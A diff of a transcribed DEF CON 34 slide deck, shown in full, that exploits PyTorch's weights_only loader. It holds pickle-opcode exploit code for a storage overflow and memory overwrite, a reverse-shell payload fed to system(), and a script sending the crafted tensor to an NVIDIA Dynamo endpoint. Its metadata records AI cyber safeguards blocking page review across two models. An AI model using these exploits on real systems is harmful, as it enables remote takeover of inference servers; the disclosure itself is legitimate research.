@@ -8,15 +8,15 @@ year: 2026
 source_pdf: "DEF CON 34/DEF CON 34 - Ji'an Zhou, Lei Lu - One Chain to Own Them All - Breaking AI Infrastructures - azraelxuemo v3.pdf"
 pages: 143
 sha256: "0ab97ef76707c58a515d9ea2732e5cb33e69a9f9585016d390fb98cec1def43c"
-text_chars: 123428
+text_chars: 131985
 ocr_pages: 115
 has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 87.8
 ocr_unreliable_blocks: 9
-content_note: "91 of 143 pages were rendered and read against the source PDF by a vision model; 87 were rewritten. PAGES 66-91 AND 118-143 WERE NOT REVIEWED: four batches were stopped by the model API's cyber safeguards, which trigger on this deck's subject rather than on any individual page. Those 52 pages remain first-pass extraction and are not verified."
+content_note: "117 of 143 pages were rendered and read against the source PDF by a vision model; 112 were rewritten. PAGES 79-91 AND 118-130 WERE NOT REVIEWED: both ranges were stopped by the model API's cyber safeguards on two different models. Those 26 pages remain first-pass extraction and are not verified. See markdown/UNVERIFIED.md."
 vision_verified_pages_changed: 25
-vision_verified_pages: 91
+vision_verified_pages: 117
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
 companion_files: []
@@ -2037,75 +2037,128 @@ def persistent_load(saved_id):
 
 ### **Try Again**
 
+```python
+patch = b'\x80\x02ctorch._utils...'
+with open("tensor/data.pkl","wb") as f:
+    f.write(patch)
+os.system("zip –r tensor.pt tensor/")
+```
+
+```python
+storage = persistent_load(('storage',
+        torch.LongStorage, '0', 'cpu', 10))
+```
+(arrow down)
+```python
+storage = persistent_load(('storage',
+        torch.LongStorage, '0', 'cpu', 20))
+```
+
+```python
+def load_tensor(dtype, numel, key, location):
+    name = f"data/{key}"
+    ...
+    storage = (
+        zip_file.get_storage_from_record(name,
+                    numel, torch.UntypedStorage)
+        ._typed_storage()
+        ._untyped_storage
+    )
+    ...
+    typed_storage = torch.storage.TypedStorage(
+        wrap_storage=wrap_storage,
+        dtype=dtype,
+        _internal=True,
+    )
+```
+
+Debugger panel (arrow points here from the `storage = (...)` block above):
+```text
+storage = {UntypedStorage: 160}  1\n 0\n
+  > device = {device} device(type='cpu')
+    filename = {NoneType} None
+    is_cuda = {bool} False
+```
+
+Debugger panel (arrow points here from the `typed_storage = torch.storage.TypedStorage(...)` block above):
+```text
+typed_storage = {TypedStorage: 20}  1\n 2\n
+  > device = {device} device(type='cpu')
+  > dtype = {dtype} torch.int64
+```
+
 😱 Overflow
 
-66
-
-
-> Recovered by OCR — confidence 82/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
-
 ```text
-“Try Again
-storage = persistent_load(('storage',
-patch = b' \x80\x@2ctorch »_utils waa torch. LongSto rage, 'Q' , ' cpu ' , 10) )
-with open("tensor/data.pkl","wb") as f: |
-f.write(patch)
-os.system("zip —r tensor.pt tensor/") storage = persistent_load(('storage',
-torch.LongStorage, '@', 'cpu', 20))
-=] 1
-def load_tensor(dtype, numel, key, location): & storage = {UntypedStorage: 160}| 1\n 0\n 2
-name = f"data/{key}" a > §& device = {device} device(type='cpu') :
-sas a2 filename = {Nonelype} None 5
-storage = ( 82 is_cuda = {bool} False ;
-zip_file.get_storage_from_record(name, 8 62 Overflow
-numel, torch.UntypedStorage) *o
-._typed_storage() 256
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+256
 977
-»_untyped_storage 659411806
-) 7194841895290213545,
+659411806
+7194841895290213545
 931
-pas -1
-S typed_storage = {TypedStorage: 20} 1\n 2\n 4423776321828644210
-> S& device = {device} device(type='cpu') 3688834454662362930
-dtype=dtype,
-_internal=True,
-> =| dtype = {dtype} torch.int64 [torch.storage.TypedStorage(dtype=torch.int64, device=cpu) of size 20]
-66
+-1
+7526707116047693884
+4423776321828644210
+3978707479627919394
+3688834454662362930
+[torch.storage.TypedStorage(dtype=torch.int64, device=cpu) of size 20]
 ```
 
 ## Slide 67
 
 ### **Why?**
 
-67
+```python
+storage = persistent_load(('storage',
+        torch.LongStorage, '0', 'cpu', 20))
+```
 
+```python
+storage = (
+    zip_file.get_storage_from_record(name, numel,
+                                       torch.UntypedStorage)
+    ._typed_storage()
+    ._untyped_storage)
+```
 
-> Recovered by OCR — confidence 80/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+```cpp
+1  .def("get_storage_from_record",
+2          [](PyTorchStreamReader& self,
+3             const std::string& key,
+4             size_t numel,
+5             py::object data_type_obj) {
+6           at::DataPtr data(std::get<0>(self.getRecord(key)));
+7           ...
+8           //Missing Size Check!!!
+9           c10::Storage storage(
+10              c10::Storage::use_byte_size_t(),
+11              numel * elementSize(scalar_type),
+12              std::move(data),
+13              /*allocator=*/nullptr,
+14              /*resizable=*/false);
+15          ...
+16      })
+```
 
 ```text
-storage = (
-zip_file.get_storage_from_record(name, numel,
-torch.UntypedStorage)
-storage = persistent_load(('storage',
-torch.LongStorage, ‘'@', ‘cpu', 20))
-._typed_storage()
-._untyped_storage)
-.def("get_st
-orage_from_record"
-(PyTorchStreamReader& self,
-size_t numel,
-py::object data_type_obj) {
-[(.venv) xuemo>xxd tensor/data/®
-at::DataPtr data(std::get<@>(self.getRecord(key))); @0000010: 63 04
-//Missing Size Check!!! 00000030: 07 es
-c10::Storage storage(
-c1@::Storage::use_byte_size_t(),
-numel * elementSize(scalar_type),
-/*resizable=*/false);
-})
-00000040:
-67
+[(.venv) xuemo>xxd tensor/data/0
+00000000: 0100 0000 0000 0000 0200 0000 0000 0000
+00000010: 0300 0000 0000 0000 0400 0000 0000 0000
+00000020: 0500 0000 0000 0000 0600 0000 0000 0000
+00000030: 0700 0000 0000 0000 0800 0000 0000 0000
+00000040: 0900 0000 0000 0000 0a00 0000 0000 0000
 ```
+
+(Red arrows connect the `20` in the top-left snippet to the `numel` parameter on line 4 of the C++ code; blue arrows connect the hex dump bytes to the `at::DataPtr data(...)` line.)
 
 ## Slide 68
 
@@ -2113,56 +2166,78 @@ numel * elementSize(scalar_type),
 
 ###### 1. Prepare base model
 
-3.  Patch & Save
+```python
+import os
+from pickle import *
+from struct import pack
+import torch
+tensor = torch.tensor([1,2,3,4,5,6,7,8,9,10],
+                        dtype=torch.long)
+torch.save(tensor, "tensor.pt")
+os.system("rm -rf tensor")
+os.system("unzip tensor.pt")
+```
 
 ###### 2. Evil pickle opcode
 
-68
+```python
+def generate_overflow_tensor_pid(length,pid):
+    poc = GLOBAL+b"torch._utils\n_rebuild_tensor_v2\n"
+    poc += MARK
 
+    poc += MARK
+    poc += BINUNICODE+b"\x07\x00\x00\x00"+b"storage"
+    poc += GLOBAL+b"torch\nLongStorage\n"
+    poc += BININT+pack("<i",pid)
+    poc += BINUNICODE+b"\x03\x00\x00\x00"+b"cpu"
+    poc += BININT+pack("<i",length) # Bug here!!
+    poc += TUPLE+BINPERSID
 
-> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+    poc += BININT1+b"\x00" #storage_offset
+    poc += BININT + pack("<i", length)+TUPLE1 #size
+    poc += BININT1+b"\x01"+TUPLE1 #stride
+    poc += NEWFALSE
+    poc += GLOBAL+b"collections\nOrderedDict\n"
+    poc += EMPTY_TUPLE
+    poc += NEWOBJ
+    poc+=TUPLE
+    poc+=REDUCE
+    return poc
+```
 
-```text
-"Full Attack Flow
-1. Prepare base model
-import os
-from pickle import x
-from struct import pack
-2. Evil pickle opcode
-def generate_overflow_tensor_pid( length, pid):
-poc = GLOBAL+b"torch._utils\n_rebuild_tensor_v2\n"
-A poc += MARK
-import torch
-tensor = torch.tensor([1,2,3,4,5,6,7,8,9,10], poc += MARK
-dtype=torch. long) poc += BINUNICODE+b"\x07\x00\x00\x00"+b"storage"
-torch.save(tensor, "tensor.pt") poc += GLOBAL+b"torch\nLongStorage\n"
-os.system("rm -rf tensor") poc += BININT+pack("<i", pid)
-os.system("unzip tensor.pt") poc += BINUNICODE+b"\x@3\x00\x00\x00"+b" cpu"
-poc += BININT+pack("<i", length) # Bug here!!
-poc += TUPLE+BINPERSID
-poc += BININT1+b"\x@0" #storage_offset
-poc += BININT + pack("<i", length)+TUPLE1 #size
-poc += BININT1+b"\x@1"+TUPLE1 #stride
-3. Patch & Save poc += NEWFALSE
-poc = generate_overflow_tensor_pid(0x20,Q) poc += GLOBAL+bcollections\nOrderedDict\n"
-poc += STOP poc += EMPTY_TUPLE
-, = NEWOBJ
-with open("tensor/data.pkl","wb") as f: oe TUPLE
-f.write(poc) P
-a) 7 poc+=REDUCE
-os.system("zip -r tensor.pt tensor/") return poc
-68
+###### 3. Patch & Save
+
+```python
+poc = generate_overflow_tensor_pid(0x20,0)
+poc += STOP
+with open("tensor/data.pkl","wb") as f:
+    f.write(poc)
+os.system("zip -r tensor.pt tensor/")
 ```
 
 ## Slide 69
 
 ### **Full Attack Flow**
 
-###### 4.  Load & Trigger
+###### 4. Load & Trigger
+
+```python
+import torch
+print(torch.load("tensor.pt"))
+```
 
 ###### Overflow
 
-69
+```text
+tensor([              1,              2,              3,              4,
+                       5,              6,              7,              8,
+                       9,             10,              0,             33,
+        123235496624128, 124189304437760,              0,             33,
+        123239791591424, 124189304437536,              0,             33,
+        123244086558720, 124189304437536, 124189304437536,             33,
+        123248381526016, 124189304437536,              0,             33,
+        123252676493312, 124189304437536,              0,             33])
+```
 
 ## Slide 70
 
@@ -2174,113 +2249,130 @@ os.system("zip -r tensor.pt tensor/") return poc
 
 ### **SETITEM & SETITEMS**
 
+```python
+elif key[0] == SETITEM[0]:
+    (v, k) = (self.stack.pop(), self.stack.pop())
+    self.stack[-1][k] = v
+elif key[0] == SETITEMS[0]:
+    items = self.pop_mark()
+    for i in range(0, len(items), 2):
+        self.stack[-1][items[i]] = items[i + 1]
+```
+
 🤩 We can fully control the index and the value
 
-71
+**1. Stack Before Execution**
+- Top (Popped First): `v = 0xaaaa`
+- Middle (Popped Second): `k = 1`
+- Bottom (Target Object): `tmp_tensor = [1, 2, 3, 4]`
 
-
-> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"SETITEM & SETITEMS
-(v, k) = (self.stack.pop(), self.stack.pop() )
-self.stack[-1] [k] = v
-elif key[0] == SETITEMS[@]:
-items = self.pop_mark()
-for i in range(@, len(items), 2):
-self.stack[-1] [items[i]] = items[i + 1]
-© We can fully control the index and the value
-1. Stack Before Execution 2. VM Execution 3. Stack After
-Top (Popped First)
-v = Oxaaaa
+**2. VM Execution**
+```python
 v = stack.pop()
-) > # gets Oxaaaa
-Middle (Popped Second) k = stack.pop() b New Top (Updated Object)
-k=1 Pe # gets 1 mp_tensor = [1, @Oxaaaa, 3, 4]
+  # gets 0xaaaa
+k = stack.pop()
+  # gets 1
 stack[-1][k] = v
-ota > # tmp_tensor[1]=Oxaaaa
-Bottom (Target Object) |_u--
+  # tmp_tensor[1]=0xaaaa
 ```
+
+**3. Stack After**
+- New Top (Updated Object): `tmp_tensor = [1, 0xaaaa, 3, 4]`
 
 ## Slide 72
 
 ### **Have a Try!**
 
-72
+```python
+overflow_length = 256
+poc = generate_overflow_tensor_pid(overflow_length,0)
 
+for i in range(overflow_length):
+    poc += MARK
+    poc += BININT + pack("<i", i)
+    poc+=BINFLOAT+pack(">d", 0xaaaaaaaa)##overwrite
+    poc+=SETITEMS
+poc += STOP
 
-> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+with open("tensor/data.pkl","wb") as f:
+    f.write(poc)
+os.system("zip -r tensor.pt tensor/")
+```
+
+```python
+        import torch
+        torch.load("tensor.pt")
+```
 
 ```text
-“Have a Try!
-overflow_length = 256
-poc = generate_overflow_tensor_pid(overflow_length, 0)
-for i in range(overflow_length) :
-poc += MARK
-poc += BININT + pack("<i", i)
-poc+=SETITEMS
-poc += STOP
-with open("tensor/data.pkl","wb") as f:
-f.write(poc)
-os.system("zip -r tensor.pt tensor/")
-import torch
-torch. load("tensor.pt")
 xuemo>python3 load.py
 /home/xuemo/pytorch-2.8.0/.venv/lib
 module named 'numpy' (Triggered int
-cpu = _conversion_method_template
+  cpu = _conversion_method_template
 Segmentation fault (core dumped)
-72
 ```
 
 ## Slide 73
 
 ### **Memory Structure**
 
-73
+**c10::TensorImpl**
+`storage_` → (arrow to c10::StorageImpl table below)
 
+**c10::StorageImpl (Memory Layout)**
 
-> Recovered by OCR — confidence 81/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+| Address | slot[0] | slot[1] |
+|---|---|---|
+| 0 | vptr | refcount_ + weakcount_ |
+| 0x10 | data_ptr_.ptr_.data_ | data_ptr_.ptr_.ctx_.deleter |
+| 0x20 | data_ptr_.ptr_.ctx_.ptr | data_ptr_.device_ |
+| 0x30 | size_bytes_ | [next fields omitted] |
 
-```text
-“Memory Structure
-c10::Storagelmp! (Memory Layout)
-Address’ slot[0] slot[1]
-Cleanup / Destructor Logic
-: deleter_(ctx_.ptr);
-0x10 data_ptr_.ptr_.data_ ® data_ptr_.ptr_.ctx_.deleter o--- Pp:
-! .
-1
-1
-1
-1
-storage_
+(dashed arrow from slot[1] row 0x10 `data_ptr_.ptr_.ctx_.deleter` points to:)
+
+**Cleanup / Destructor Logic**
+```cpp
+deleter_(ctx_.ptr);
 // data_ == ctx_.ptr
-0x30 size_bytes_ [next fields omitted]
-1
-Target Real Memory (Data)
-73
 ```
+
+(dashed arrow from slot[0] row 0x10 `data_ptr_.ptr_.data_` points down to:)
+
+**Target Real Memory (Data)**
+
+| 1 | 2 | 3 | 4 |
+|---|---|---|---|
 
 ## Slide 74
 
 ### **A Simple Way to Achieve RCE**
 
-74
+**c10::TensorImpl**
+`storage_` → (arrow to c10::StorageImpl table below)
 
+**c10::StorageImpl (Corrupted Memory Layout)**
 
-> Recovered by OCR — confidence 70/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+| Address | slot[0] | slot[1] |
+|---|---|---|
+| 0 | vptr | refcount_ + weakcount_ |
+| 0x10 | **data_ptr_.ptr_.data_** | **data_ptr_.ptr_.ctx_.deleter** |
+| 0x20 | data_ptr_.ptr_.ctx_.ptr | data_ptr_.device_ |
+| 0x30 | size_bytes_ | [next fields omitted] |
 
+(dashed red arrow from slot[1] row 0x10 `data_ptr_.ptr_.ctx_.deleter` points to:)
+
+**Hijacked Destructor Logic**
+```cpp
+~~deleter_(ctx_.ptr);~~
+system(ctx_.ptr);
+// exec shell payload
+```
+
+(dashed red arrow from slot[0] row 0x10 `data_ptr_.ptr_.data_` points down to:)
+
+**Target Real Memory (Overwritten Payload)**
 ```text
-“A Simple Way to Achieve RCE
-c10::Storagelmp! (Corrupted Memory Layout)
-of0:;Tensorimp! Address slot[0] slot[1] Hijacked Destructor Logic
-storage_ 0 vptr refcount_ + weakcount_ i. ie: '
-0x10 data_ptr_.ptr_.data_ ° data_ptr_.ptr_.ctx_.deleter e@-- -> system (eee pt r) :
-L 0x30 size_bytes_ [next™ fields omitted] J
-Target Real Memory overwritten Payload)
 "bash -i >&/dev/tcp/ip/port 0>&1\0"
-74
 ```
 
 ## Slide 75
@@ -2289,39 +2381,41 @@ Target Real Memory overwritten Payload)
 
 😢 How can we leak?
 
-75
+**c10::TensorImpl**
+`storage_` → (arrow to c10::StorageImpl table below)
 
+**c10::StorageImpl (Corrupted Memory Layout)**
 
-> Recovered by OCR — confidence 74/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+| Address | slot[0] | slot[1] |
+|---|---|---|
+| 0 | vptr | refcount_ + weakcount_ |
+| 0x10 | **data_ptr_.ptr_.data_** | **data_ptr_.ptr_.ctx_.deleter** |
+| 0x20 | data_ptr_.ptr_.ctx_.ptr | data_ptr_.device_ |
+| 0x30 | size_bytes_ | [next fields omitted] |
 
+(dashed red arrow from slot[1] row 0x10 `data_ptr_.ptr_.ctx_.deleter` points to:)
+
+**Hijacked Destructor Logic**
+```cpp
+~~deleter_(ctx_.ptr);~~
+system(ctx_.ptr);
+// exec shell payload
+```
+
+(dashed red arrow from slot[0] row 0x10 `data_ptr_.ptr_.data_` points down to:)
+
+**Target Real Memory (Overwritten Payload)**
 ```text
-“A Simple Way to Achieve RCE
-& How can we leak?
-c10::Storagelmp! (Corrupted Memory Layout)
-elec Address | stotlel stot(1] Hijacked Destructor Logic
-storage_ 0 vptr refcount_ + weakcount_ r
-0x10 data_ptr_.ptr_.data_ ° data_ptr_.ptr_.ctx_.deleter o-- -p system (eee pt r) F
-L 0x30 size_bytes_ [next™ fields omitted] J
-Target Real Memory overwritten Payload)
 "bash -i >&/dev/tcp/ip/port 0>&1\0"
-75
 ```
 
 ## Slide 76
 
 ### **All Supported Opcodes**
 
-😭
-
-No opcode for leak
-
-76
-
-
-> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+😭 No opcode for leak
 
 ```text
-“All Supported Opcodes
 APPEND,
 APPENDS,
 BINFLOAT,
@@ -2339,7 +2433,9 @@ EMPTY_SET,
 EMPTY_TUPLE,
 GLOBAL,
 LONG1,
-No opcode for leak
+```
+
+```text
 LONG_BINGET,
 LONG_BINPUT,
 MARK,
@@ -2361,15 +2457,39 @@ TUPLE3,
 
 ## Slide 77
 
-77
+*Meme image (imgflip.com watermark) captioned "All Effort in Vain": a cartoon dog wearing a hat sits calmly at a table with a coffee mug while the room around it burns.*
 
 ## Slide 78
 
 ### **An Accidental Discovery**
 
-🤣 No PIE! 🤔 But why?
+🤣 No PIE!
+🤔 But why?
 
-78
+```text
+[illegible - truncated line above]
+xuemo>checksec --file=/usr/bin/python3
+[*] '/usr/bin/python3'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    FORTIFY:    Enabled
+xuemo>lsb_release -a
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 24.04.3 LTS
+Release:        24.04
+Codename:       noble
+```
+
+```text
+root@c060dcf33cdd:/vllm-workspace# checksec --file=/usr/bin/python3
+RELRO           STACK CANARY   NX           PIE      RPATH      RUNPATH      Symbols      FORTIFY  Fortified  Fortifiable  FILE
+Partial RELRO    Canary found   NX enabled   No PIE   No RPATH   No RUNPATH   No Symbols   Yes      19         40           /usr/bin/python3
+[illegible - truncated row cut off at bottom of slide]
+```
 
 ## Slide 79
 
@@ -3833,429 +3953,367 @@ Exception: Unable to create lease. Check etcd server status at http://localhost:
 
 ### **Deploy Successfully**
 
-131
-
-
-> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+```bash
+nats-server -js &
+etcd --listen-client-urls http://0.0.0.0:2379
+    --advertise-client-urls http://0.0.0.0:2379
+    --data-dir /tmp/etcd &
+python -m dynamo.frontend &
+python -m dynamo.vllm --model Qwen/Qwen3-0.6B
+```
 
 ```text
-“Deploy Successfully
-nats-server -js &
-etcd --listen-client-urls http://@.0.0.0:2379
--—-data-dir /tmp/etcd &
-python -m dynamo.frontend &
-python -m dynamo.vllm --model Qwen/Qwen3-2@.6B
-INFO Initializing KV store discovery backend
-INFO Initializing NetworkManager with TCP request plane mode=tcp host=192.
-168.1.9 port-OS-assigned
-INFO Starting HTTP(S) service protocol="HTTP" address="0.0.0.0:8000"
-Cannot connect to ModelExpress server: Transport error: transport error. Using direct download.
-INFO Downloading model 'Qwen/Qwen3-@.6B' using provider: Hugging Face
-ARN “ignore_weights* is set to true. All the model weight files will be ignored!
-INFO Downloading model from Hugging Face: Qwen/Qwen3-@.6B
-INFO Using cache directory: "/home/dynamo/.cache/huggingface/hub"
-INFO Got model info: RepoInfo { siblings: [Siblings { rfilename: ".gitatt
-ributes" }, Siblings { rfilename: "LICENSE" }, Siblings { rfilename: "README.md" }, Siblings { rfilename: "config.json" }, Siblings { rfilename: "g
-eneration_config.json" }, Siblings { rfilename: "merges.txt" }, Siblings { rfilename: "model.safetensors" }, Siblings { rfilename: "tokenizer.json"
-}, Siblings { rfilename: "tokenizer_config.json" }, Siblings { rfilename: "vocab.json" }], sha: "c1899de289a04d12100db370d81485cdf75e47ca" }
-INFO Downloaded model files for Qwen/Qwen3-0.6B
-INFO ModelExpress download completed successfully for model: Qwen/Qwen3-0.6B
-INFO chat endpoints enabled
-INFO completion endpoints enabled
-INFO Chat completions is ready
-INFO Completions is ready
-INFO added_model_model_name="Qwen/Qwen3-@.6B"_namespace="dynamo" 131
+tcp0        0        0 ...:22                    ...:*                    LISTEN      -
+dynamo@gpu-v100:/workspace$ python -m dynamo.frontend
+2026-04-15T05:20:54.075190Z  INFO dynamo_runtime::distributed: Initializing KV store discovery backend
+2026-04-15T05:20:54.076510Z  INFO dynamo_runtime::pipeline::network::manager: Initializing NetworkManager with TCP request plane mode=tcp host=192.168.1.9 port=OS-assigned
+2026-04-15T05:20:54.112022Z  INFO dynamo_llm::http::service::service_v2: Starting HTTP(S) service protocol="HTTP" address="0.0.0.0:8000"
+
+2026-04-15T05:32:09.271747Z  WARN dynamo_llm::hub: Cannot connect to ModelExpress server: Transport error: transport error. Using direct download.
+2026-04-15T05:32:09.272155Z  INFO modelexpress_common::download: Downloading model 'Qwen/Qwen3-0.6B' using provider: Hugging Face
+2026-04-15T05:32:09.272177Z  WARN modelexpress_common::download: `ignore_weights` is set to true. All the model weight files will be ignored!
+2026-04-15T05:32:09.272195Z  INFO modelexpress_common::providers::huggingface: Downloading model from Hugging Face: Qwen/Qwen3-0.6B
+2026-04-15T05:32:09.272226Z  INFO modelexpress_common::providers::huggingface: Using cache directory: "/home/dynamo/.cache/huggingface/hub"
+2026-04-15T05:32:10.387629Z  INFO modelexpress_common::providers::huggingface: Got model info: RepoInfo { siblings: [Siblings { rfilename: ".gitattributes" }, Siblings { rfilename: "LICENSE" }, Siblings { rfilename: "README.md" }, Siblings { rfilename: "config.json" }, Siblings { rfilename: "generation_config.json" }, Siblings { rfilename: "merges.txt" }, Siblings { rfilename: "model.safetensors" }, Siblings { rfilename: "tokenizer.json" }, Siblings { rfilename: "tokenizer_config.json" }, Siblings { rfilename: "vocab.json" }], sha: "c1899de289a04d12100db370d81485cdf75e47ca" }
+2026-04-15T05:32:10.387797Z  INFO modelexpress_common::providers::huggingface: Downloaded model files for Qwen/Qwen3-0.6B
+2026-04-15T05:32:10.387848Z  INFO dynamo_llm::hub: ModelExpress download completed successfully for model: Qwen/Qwen3-0.6B
+2026-04-15T05:32:10.755625Z  INFO dynamo_llm::http::service::service_v2: chat endpoints enabled
+2026-04-15T05:32:10.755659Z  INFO dynamo_llm::http::service::service_v2: completion endpoints enabled
+2026-04-15T05:32:10.812502Z  INFO dynamo_llm::discovery::watcher: Chat completions is ready
+2026-04-15T05:32:10.845055Z  INFO dynamo_llm::discovery::watcher: Completions is ready
+2026-04-15T05:32:10.845085Z  INFO dynamo_llm::discovery::watcher: added model model_name="Qwen/Qwen3-0.6B" namespace="dynamo"
 ```
+
+*(The final three log lines above — "Chat completions is ready", "Completions is ready", "added model ...") are highlighted with a red box callout.)*
+
+131
 
 ## Slide 132
 
 ### **Architecture**
 
+*Diagram comparing two architectures, connected by a red arrow pointing from the left panel to the right panel.*
+
+**vLLM Native**
+- Client
+- **HTTP Server** — Python · FastAPI · uvicorn
+- ⚡ **AsyncLLM Engine** — GPU Inference Core
+- *All in one Python process*
+
+**NVIDIA Dynamo**
+- Client
+- **Dynamo Frontend**
+  - **HTTP Server** — Rust · Axum · Tokio
+- ⋯ TCP ⋯
+- **vLLM Worker (Python)**
+  - ⚡ **AsyncLLM Engine**
+- *Frontend & Worker are separate processes*
+
+*A dashed red line labeled **Same Engine** connects the AsyncLLM Engine box on the left (vLLM Native) to the AsyncLLM Engine box on the right (Dynamo's vLLM Worker).*
+
 132
-
-
-> Recovered by OCR — confidence 87/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Architecture
-vLLM Native NVIDIA Dynamo
-Client Client
-Dynamo Frontend
-HTTP Server ,
-Python - FastAPI - uvicorn HTTP Server
-Rust - Axum - Tokio
-vLLM Worker (Python)
-All in one Python process rene Bae + AsyncLLM Engine
-Frontend & Worker are separate processes
-GPU Inference Core
-132
-```
 
 ## Slide 133
 
 ### **The Vuln**
 
-133
+*Diagram — top row, three boxes connected by arrows:*
 
+**Rust Frontend** (HTTP → Validate → Route) —TCP→ **Python Worker** (decode prompt_embeds) → **torch.load()** (weights_only=True)
 
-> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+*Bottom row — three panels; the first two are connected by a dashed line labeled TCP, the second and third by a solid line:*
 
-```text
-"The Vuln
-Rust Frontend
-HTTP — Validate — Route
-Rust Frontend
-. handler_completions()
-. completions_single()
-. engine.generate()
-. Preprocessor (validate)
-. PushRouter — TCP send
-Python Worker
-decode prompt_embeds
-Python Worker
+**Rust Frontend**
+1. handler_completions()
+2. completions_single()
+3. engine.generate()
+4. Preprocessor (validate)
+5. PushRouter → TCP send
+
+**Python Worker**
 6. generate()
 7. _generate_token_mode()
 8. _build_prompt()
 9. _decode_prompt_embeds()
-torch.load()
-weights_only=True
-Deserialization
+
+**Deserialization**
 10. base64 decode
-11. torch.load(buf)
-weights_only=True ¥
+11. torch.load(buf) — weights_only=True ✓
+
 133
-```
 
 ## Slide 134
 
 ### **Leak Achieved**
 
-134
-
-
-> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
-
-```text
-“Leak Achieved
+```python
 import requests
 import base64
+
 url = "http://127.0.0.1:8000/v1/completions"
 headers = {
+    "Content-Type": "application/json"
 }
-content=
-"Content-Type": "application/json"
+content=""
 with open("tensor.pt","rb") as f:
-content=base64. b64encode(f.read()).decode()
+    content=base64.b64encode(f.read()).decode()
 data = {
+    "model": "Qwen/Qwen3-0.6B",
+    "prompt": "x",
+    "prompt_embeds":content,
+    "stream":False
 }
-response = requests.post(url, headers=headers,
-"prompt": x",
-‘dynamo@iv-yeqdbeqém8ay8n848rzF: /tmp/exp$ python3 send.py ]
-{"message":"Failed to fold completions stream for @cd43495-4ceb-4491-aa19-f6af16@a8e96: unknown variant “error: Invalid
-prompt_embeds: Failed to decode prompt_embeds as PyTorch tensor: Weights only load failed. In PyTorch 2.6, we changed th
-e default value of the ‘weights_only* argument in “torch.load* from “False* to ‘True’. Re-running ‘torch.load* with ‘wei
-ghts_only* set to ‘False’ will likely succeed, but it can result in arbitrary code execution. Do it only if you got the
-file from a trusted source.\nPlease file an issue with the following so that we can make ‘weights_only=True~ compatible
-with your use case: WeightsUnpickler error: \n\nOnly persistent_load of storage is allowed, but got tensor([
-OF 97,\n 322170851, 4285345213156097082, 110425377238528, \n
-33, e, @,\n 8, @1)\n\nCheck the docu
-mentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/
-generated/torch.load.html.*, expected one of ‘eos’, ‘length’, ‘stop’, ‘error’, ‘cancelled’, “content_filter’ at line 1c
-olumn 1276","type":"Internal Server Error", "code":500}
-INFO TCP request plane server started actual_addr=172.31.2.19:33777 actual_port-33777
-INFO Registered endpoint ‘unload_lora' with shared TCP server on 172.31.2.19:337
-INFO Registered endpoint 'list_loras' with shared TCP server on 172.31.2.19:3377
-INFO Registered endpoint 'clear_kv_blocks' with shared TCP server on 172.31.2.19
-INFO Registered endpoint 'load_lora' with shared TCP server on 172.31.2.19:33777
-INFO Registered endpoint 'generate' with shared TCP server on 172.31.2.19:33777
-ERROR Failed to decode prompt_embeds: Weights only load failed. In PyTorch 2.6, we changed the default value of th
-d* from ‘False to ‘True’. Re-running “torch.load* with ‘weights_only* set to ‘False’ will likely succeed, but it can result in arbitrary code execution. Do it only if you go
-Please file an issue with the following so that we can make ‘weights_only=True* compatible with your use case: WeightsUnpickler error:
-Only persistent_load of storage is allowed, but got tensor({ 1, 2, 3,
-10, 9, 97,
-322170851, 4285345213156097082, 110425377238528,
-Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.
-ERROR Failed to process prompt_embeds for request @cd43495-4ceb-4491-aa19-féaf160a8e96: Failed to decode prom
-ly load failed. In PyTorch 2.6, we changed the default value of the ‘weights_only’ argument in ‘torch.load’ from ‘False’ to ‘True’. Re-running ‘torch.load* with ‘weights_only
-; = t it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
-json=data) u Su: y xeCU y you gi us Qu:
-Please file an issue with the following so that we can make ‘weights_only=True* compatible with your use case: WeightsUnpickler error:
-Only persistent_load of storage is allowed, but got tensor({ 1, 2, 3,
-10, 9, 97,
-322170851, 4285345213156097082, 110425377238528,
-a the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.
-134
+response = requests.post(url, headers=headers, json=data)
+print(response.text)
 ```
+
+**This block contains dense numeric/tensor data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
+
+```text
+dynamo@iv-yeqdb0q6m8ay8n848rzf:/tmp/exp$ python3 send.py
